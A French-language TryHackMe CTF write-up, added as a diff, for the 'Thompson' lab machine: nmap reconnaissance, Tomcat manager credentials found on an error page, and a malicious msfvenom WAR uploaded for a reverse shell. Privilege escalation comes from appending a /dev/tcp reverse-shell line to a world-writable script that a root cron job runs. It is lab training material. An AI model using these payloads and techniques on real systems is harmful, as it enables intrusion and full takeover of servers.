@@ -1,0 +1,170 @@
+---
+title: Thompson
+tags: [TryHackMe, Facile, Tomcat]
+style: border
+color: thm
+comments: false
+description: Exploitation d'un serveur Apache Tomcat
+---
+
+# Thompson (Guatemala CTF) <!-- omit in toc -->
+
+Lien vers l'épreuve : <https://tryhackme.com/r/room/bsidesgtthompson>
+
+![Easy](https://img.shields.io/badge/Difficulté-Facile-Green?logo=tryhackme)
+
+## Sommaire <!-- omit in toc -->
+
+* [1. Reconnaissance](#1-reconnaissance)
+* [2. Visite du site](#2-visite-du-site)
+* [3. Accès au serveur](#3-accès-au-serveur)
+* [4. Flag utilisateur](#4-flag-utilisateur)
+* [5. Elevation de privilèges](#5-elevation-de-privilèges)
+
+---
+
+## 1. Reconnaissance
+
+```bash
+nmap -T4 -A 10.10.216.88
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-30 15:39 CEST
+Nmap scan report for 10.10.216.88
+Host is up (0.057s latency).
+Not shown: 997 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
+|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
+|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
+8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
+|_ajp-methods: Failed to get a valid response for the OPTION request
+8080/tcp open  http    Apache Tomcat 8.5.5
+|_http-favicon: Apache Tomcat
+|_http-title: Apache Tomcat/8.5.5
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+L'analyse par le scanner Nmap nous montre que la machine héberge un serveur SSH sur le port 22 et un serveur Apache Tomcat sur le port 8080.
+
+Commençons donc par analyser le site.
+
+## 2. Visite du site
+
+Nous arrivons sur la page par défaut d'un serveur Apache.
+
+{% include elements/figure.html image="../images/THM/20240830/VirtualBox_Kali Hack_30_08_2024_15_47_30.png" caption="Première connexion" %}
+
+La tentative de connexion aux outils d'administration en utilisant des identifiants potentiels comme admin/admin ou tomcat/tomcat n'a pas fonctionné.
+
+Lorsque nous annulons finalement l'authentification, nous arrivons sur une page d'erreur particulièrement verbeuse donnant des identifiants.
+
+{% include elements/figure.html image="../images/THM/20240830/Capture_ecran_2024-08-30_401.png" caption="Identifiants dévoilés dans la page d'erreur" %}
+
+## 3. Accès au serveur
+
+En navigant, nous arrivons sur une page permettant de déployer des fichiers au format WAR (*Web Application Archive*)
+
+En faisant une recherche sur la dépôt Github [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings), nous pouvons trouver une commande permettant de créer un fichier WAR malicieux permettant d'obtenir un *reverse shell* :
+
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war
+```
+
+Après avoir créé la charge avec les données correspondant à notre machine et avoir mis le port (le même qu'indiqué dans `LPORT`) de notre machine en écoute avec Netcat, nous pouvons téléverser le fichier `reverse.war`, puis cliquer sur le nouveau lien "reverse" qui vient d'apparaître sur l'interface.
+
+Nous sommes à présent connecter au serveur.
+
+```bash
+nc -lvnp 9000           
+listening on [any] 9000 ...
+connect to [10.9.1.218] from (UNKNOWN) [10.10.216.88] 55446
+id
+uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
+```
+
+## 4. Flag utilisateur
+
+Améliorons le shell obtenu pour faciliter la navigation :
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+L'utilisateur dont nous devons trouver les identifiants est Jack.
+
+```bash
+ls -hAl /home
+total 4.0K
+drwxr-xr-x 4 jack jack 4.0K Aug 23  2019 jack
+```
+
+Les 3 derniers caractères `r-x` indique que n'importe quel utilisateur peut lire ou se déplacer dans le répertoire de l'utilisateur. Mieux encore, le flag utilisateur est également lisible. Tout comme un script `id.sh` qui est également exécutable par tout le monde.
+
+```bash
+ls -hl
+total 12K
+-rwxrwxrwx 1 jack jack 26 Aug 14  2019 id.sh
+-rw-r--r-- 1 root root 39 Aug 30 07:26 test.txt
+-rw-rw-r-- 1 jack jack 33 Aug 14  2019 user.txt
+```
+
+```bash
+cat user.txt
+39400c[...expurgé...]f181bf
+```
+
+## 5. Elevation de privilèges
+
+L'analyse des autres fichiers présents dans le dossier personnel de Jack ne donne pas beaucoup d'informations. Le script permet d'écrire les informations d'un utilisateur dans le fichier test.txt
+
+```bash
+ls -hl
+total 12K
+-rwxrwxrwx 1 jack jack 26 Aug 14  2019 id.sh
+-rw-r--r-- 1 root root 39 Aug 30 07:26 test.txt
+-rw-rw-r-- 1 jack jack 33 Aug 14  2019 user.txt
+
+cat id.sh
+#!/bin/bash
+id > test.txt
+
+cat test.txt
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+ Cependant, en relançant la commande `ls -hl` un peu plus tard, nous observons que le fichier `test.txt` a changé d'horodatage il est donc plus que probable qu'un cronjob tourne sur la machine pour lancer le script id.sh :
+
+```bash
+-rw-r--r-- 1 root root 39 Aug 30 07:34 test.txt
+```
+
+En analysant le fichier `/etc/crontab` nous pouvons constater qu'il y a bien un job tournant toutes les minutes, en tant que l'utilisateur root.
+
+```bash
+* * * * *   root    cd /home/jack && bash id.sh
+```
+
+En utilisant le site [Revshells](https://www.revshells.com/) nous pouvons créer une commande à ajouter au fichier `id.sh` pour obtenir un *reverse shell* non plus en tant que "tomcat" mais cette fois "root"
+
+```bash
+echo 'sh -i >& /dev/tcp/10.0.0.1/9001 0>&1' >> id.sh
+```
+
+Mettons maintenant Netcat en attente sur le port 9001, et attendons le passage de la tâche programmée.
+
+```bash
+nc -lvnp 9001
+listening on [any] 9001 ...
+connect to [10.9.1.218] from (UNKNOWN) [10.10.216.88] 44840
+sh: 0: can't access tty; job control turned off
+id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Maintenant que nous avons obtenu les droits root sur la machine, il ne reste plus qu'à lire le fichier `/root/root.txt`
+
+```bash
+cat root.txt
+d89d53[...expurgé...]e7ca3a
+```
